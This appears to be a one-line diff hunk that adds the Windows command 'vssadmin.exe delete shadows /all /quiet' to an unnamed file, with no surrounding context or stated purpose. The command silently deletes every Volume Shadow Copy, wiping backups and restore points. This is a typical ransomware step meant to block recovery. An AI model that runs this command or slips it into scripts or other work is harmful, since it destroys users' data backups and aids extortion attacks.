@@ -1,0 +1,1 @@
+vssadmin.exe delete shadows /all /quiet
